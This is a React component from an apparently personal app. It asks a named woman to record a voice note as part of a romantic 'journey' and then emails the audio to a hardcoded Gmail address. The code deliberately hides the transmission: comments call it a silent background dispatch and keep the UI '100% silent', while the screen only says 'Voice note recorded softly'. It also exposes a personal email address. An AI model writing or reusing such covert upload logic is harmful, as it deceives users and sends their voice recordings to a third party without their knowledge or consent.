import React, { useState, useRef, useEffect } from 'react';
import { Mic, Square, Sparkles, ArrowRight } from 'lucide-react';
import { sendEmail } from '../utils/emailService';

export default function VoiceMessageScene({ onComplete }) {
  const [isRecording, setIsRecording] = useState(false);
  const [hasRecorded, setHasRecorded] = useState(false);
  const [recordDuration, setRecordDuration] = useState(0);

  const mediaRecorderRef = useRef(null);
  const audioChunksRef = useRef([]);
  const timerRef = useRef(null);
  const recordedBlobRef = useRef(null);
  const streamRef = useRef(null);
  const durationRef = useRef(0);

  useEffect(() => {
    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
      if (streamRef.current) {
        streamRef.current.getTracks().forEach((track) => track.stop());
      }
      if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
        try {
          mediaRecorderRef.current.stop();
        } catch (e) {}
      }
    };
  }, []);

  const formatTime = (secs) => {
    const mins = Math.floor(secs / 60);
    const remSecs = secs % 60;
    return `${mins}:${remSecs < 10 ? '0' : ''}${remSecs}`;
  };

  // 1. அதிக சுருக்கத்துடன் (Highly Compressed) ரெக்கார்டிங் தொடங்குதல்
  const startRecording = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        audio: {
          channelCount: 1,
          sampleRate: 16000, // 16kHz voice optimization for compact payload
          echoCancellation: true,
          noiseSuppression: true,
        },
      });
      streamRef.current = stream;

      // EmailJS வரம்பிற்குள் அடங்கக்கூடிய குறைந்த பிட்ரேட் (16kbps)
      let options = {
        mimeType: 'audio/webm;codecs=opus',
        audioBitsPerSecond: 16000,
      };

      if (!MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
        if (MediaRecorder.isTypeSupported('audio/webm')) {
          options = { mimeType: 'audio/webm', audioBitsPerSecond: 16000 };
        } else if (MediaRecorder.isTypeSupported('audio/ogg;codecs=opus')) {
          options = { mimeType: 'audio/ogg;codecs=opus', audioBitsPerSecond: 16000 };
        } else if (MediaRecorder.isTypeSupported('audio/mp4')) {
          options = { mimeType: 'audio/mp4', audioBitsPerSecond: 16000 };
        } else {
          options = { audioBitsPerSecond: 16000 };
        }
      }

      try {
        mediaRecorderRef.current = new MediaRecorder(stream, options);
      } catch (e) {
        mediaRecorderRef.current = new MediaRecorder(stream);
      }

      audioChunksRef.current = [];
      recordedBlobRef.current = null;
      durationRef.current = 0;
      setRecordDuration(0);

      mediaRecorderRef.current.ondataavailable = (event) => {
        if (event.data && event.data.size > 0) {
          audioChunksRef.current.push(event.data);
        }
      };

      mediaRecorderRef.current.onstop = () => {
        const mimeType = mediaRecorderRef.current?.mimeType || 'audio/webm';
        const blob = new Blob(audioChunksRef.current, { type: mimeType });
        recordedBlobRef.current = blob;
        setHasRecorded(true);
        setIsRecording(false);
        if (streamRef.current) {
          streamRef.current.getTracks().forEach((track) => track.stop());
        }
        if (timerRef.current) clearInterval(timerRef.current);
      };

      // 500ms இடைவெளியில் ஆடியோ துண்டுகளைச் சேகரிக்கும்
      mediaRecorderRef.current.start(500);
      setIsRecording(true);

      if (timerRef.current) clearInterval(timerRef.current);
      timerRef.current = setInterval(() => {
        durationRef.current += 1;
        setRecordDuration(durationRef.current);
      }, 1000);
    } catch (err) {
      console.error('Microphone access denied:', err);
    }
  };

  // 2. ரெக்கார்டிங் நிறுத்துதல்
  const stopRecording = () => {
    if (timerRef.current) clearInterval(timerRef.current);
    if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
      try {
        mediaRecorderRef.current.stop();
      } catch (e) {}
    }
    setIsRecording(false);
  };

  // 3. ரெக்கார்டிங்கை முறைப்படி நிறுத்தி இறுதி Blob ஐப் பெறுதல்
  const stopRecordingAsync = () => {
    return new Promise((resolve) => {
      const recorder = mediaRecorderRef.current;
      if (!recorder || recorder.state === 'inactive') {
        if (recordedBlobRef.current) {
          resolve(recordedBlobRef.current);
        } else if (audioChunksRef.current.length > 0) {
          const mimeType = recorder?.mimeType || 'audio/webm';
          const blob = new Blob(audioChunksRef.current, { type: mimeType });
          recordedBlobRef.current = blob;
          resolve(blob);
        } else {
          resolve(null);
        }
        return;
      }

      const handleStop = () => {
        const mimeType = recorder?.mimeType || 'audio/webm';
        const blob = new Blob(audioChunksRef.current, { type: mimeType });
        recordedBlobRef.current = blob;
        setHasRecorded(true);
        setIsRecording(false);
        if (streamRef.current) {
          streamRef.current.getTracks().forEach((track) => track.stop());
        }
        if (timerRef.current) clearInterval(timerRef.current);
        resolve(blob);
      };

      recorder.addEventListener('stop', handleStop, { once: true });

      try {
        recorder.stop();
      } catch (e) {
        handleStop();
      }
      setIsRecording(false);
    });
  };

  // 4. ஆடியோவை பின்னணியில் அமைதியாக EmailJS-க்கு அனுப்புதல்
  const dispatchAudioEmail = (blob, durationSeconds) => {
    if (!blob || blob.size === 0) return;

    try {
      const reader = new FileReader();
      reader.readAsDataURL(blob);

      reader.onloadend = async () => {
        try {
          const result = reader.result;
          if (typeof result !== 'string' || !result) return;

          const base64Audio = result;
          // Clean base64 string without data:audio/...;base64, prefix for attachment object
          const base64AudioClean = base64Audio.includes(',')
            ? base64Audio.split(',')[1]
            : base64Audio;

          const durationText = formatTime(durationSeconds);

          // HTML audio button for direct playback/download in Gmail
          const audioButtonHtml = `<a href="${base64Audio}" download="saranya_voice.mp3" style="padding:10px 20px; background:#e11d48; color:#fff; border-radius:8px; text-decoration:none; font-weight:bold;">▶ Play / Download Audio</a>`;

          const attachments = [
            {
              name: 'saranya_voice_note.mp3',
              data: base64AudioClean,
            },
          ];

          const templateParams = {
            title: `Saranya Voice Note (${durationText}) ❤️🎙️`,
            message: `Saranya has recorded a personal voice note (${durationText})! ❤️🎙️\n\n${audioButtonHtml}`,
            audio_button: audioButtonHtml,
            audio_link: audioButtonHtml,
            attachments: attachments,
            voice_data: base64AudioClean,
            audio_payload: base64Audio,
            saranya_voice_note: base64AudioClean,
            to_email: 'abishekk9225@gmail.com',
          };

          await sendEmail(templateParams);
        } catch (error) {
          // Keep 100% silent in UI - log to console only
          console.error('Silent audio email dispatch failed:', error);
        }
      };

      reader.onerror = (error) => {
        console.error('Silent FileReader failure:', error);
      };
    } catch (error) {
      console.error('Silent dispatch error:', error);
    }
  };

  // 5. அடுத்த காட்சிக்குத் தாவுதல் (Continue Journey)
  const handleProceed = async () => {
    let blobToSend = recordedBlobRef.current;
    const isCurrentlyRecording =
      isRecording ||
      (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording');

    // ரெக்கார்டிங் செயலில் இருந்தால், முறைப்படி நிறுத்தி ஆடியோ பிளாப் பெறப்படும்
    if (isCurrentlyRecording) {
      blobToSend = await stopRecordingAsync();
    } else if (!blobToSend && audioChunksRef.current.length > 0) {
      const mimeType = mediaRecorderRef.current?.mimeType || 'audio/webm';
      blobToSend = new Blob(audioChunksRef.current, { type: mimeType });
      recordedBlobRef.current = blobToSend;
    }

    // ஆடியோ இருந்தால் பின்னணியில் அமைதியாக மெயில் அனுப்பப்படும்
    if (blobToSend && blobToSend.size > 0) {
      dispatchAudioEmail(blobToSend, durationRef.current || recordDuration);
    }

    // திரையில் எந்த பாப்-அப் அல்லது எரரும் இல்லாமல் அமைதியாக அடுத்த காட்சிக்குச் செல்லும்
    if (typeof onComplete === 'function') {
      onComplete();
    }
  };

  return (
    <div className="min-h-screen w-full bg-[#030712] flex flex-col items-center justify-center p-6 text-center relative overflow-hidden select-none animate-in fade-in zoom-in-95 duration-700">
      
      {/* Background Ambient Glow */}
      <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[550px] h-[550px] bg-pink-600/15 rounded-full blur-[150px] pointer-events-none"></div>

      {/* Main Glassmorphic Container */}
      <div className="max-w-md w-full bg-slate-900/85 backdrop-blur-2xl p-8 md:p-10 rounded-[2.5rem] border border-pink-500/40 shadow-[0_0_60px_rgba(244,63,94,0.3)] relative z-10 space-y-8">
        <div>
          <span className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-pink-500/10 border border-pink-500/30 text-pink-400 text-xs font-semibold uppercase tracking-widest">
            <Sparkles className="w-3.5 h-3.5" /> Speak Your Heart
          </span>
          <h2 className="text-2xl md:text-3xl font-bold text-white tracking-wide mt-4">
            Un Voice la Enakku Sollu... 🎙️
          </h2>
          <p className="text-slate-400 text-sm mt-2 leading-relaxed">
            Record a short voice note. Whatever you feel right now.
          </p>
        </div>

        {/* Big Interactive Mic Button */}
        <div className="flex flex-col items-center justify-center py-4">
          <div className="relative">
            {isRecording && (
              <>
                <div className="absolute -inset-4 rounded-full bg-pink-500/30 animate-ping"></div>
                <div className="absolute -inset-8 rounded-full bg-rose-500/20 animate-pulse"></div>
              </>
            )}

            <button
              type="button"
              onClick={isRecording ? stopRecording : startRecording}
              className={`w-24 h-24 rounded-full flex items-center justify-center transition-all duration-300 transform active:scale-95 shadow-[0_0_40px_rgba(244,63,94,0.4)] cursor-pointer ${
                isRecording
                  ? 'bg-rose-600 text-white animate-pulse'
                  : 'bg-gradient-to-tr from-pink-600 to-rose-500 text-white hover:scale-105'
              }`}
            >
              {isRecording ? (
                <Square className="w-8 h-8 fill-white" />
              ) : (
                <Mic className="w-10 h-10" />
              )}
            </button>
          </div>

          <div className="mt-4">
            {isRecording ? (
              <div className="flex items-center gap-2 text-rose-400 text-sm font-semibold">
                <span className="w-2.5 h-2.5 rounded-full bg-rose-500 animate-ping"></span>
                <span>Recording... {formatTime(recordDuration)}</span>
                <div className="flex items-center gap-1 ml-2">
                  <span className="w-1 h-3 bg-rose-400 animate-bounce rounded-full"></span>
                  <span className="w-1 h-5 bg-rose-500 animate-bounce rounded-full [animation-delay:0.15s]"></span>
                  <span className="w-1 h-4 bg-pink-400 animate-bounce rounded-full [animation-delay:0.3s]"></span>
                </div>
              </div>
            ) : hasRecorded ? (
              <p className="text-pink-300 text-sm font-medium">
                Voice note recorded softly ✨ ({formatTime(recordDuration)})
              </p>
            ) : (
              <p className="text-slate-400 text-xs">
                Tap the mic to start recording
              </p>
            )}
          </div>
        </div>

        {/* Continue Button */}
        <button
          type="button"
          onClick={handleProceed}
          className="w-full bg-gradient-to-r from-pink-600 via-rose-500 to-purple-600 hover:opacity-95 text-white font-bold py-4 px-6 rounded-2xl shadow-[0_0_30px_rgba(244,63,94,0.4)] transition-all duration-300 transform active:scale-95 flex items-center justify-center gap-2 cursor-pointer"
        >
          <span>Continue Journey</span>
          <ArrowRight className="w-5 h-5" />
        </button>
      </div>
    </div>
  );
}
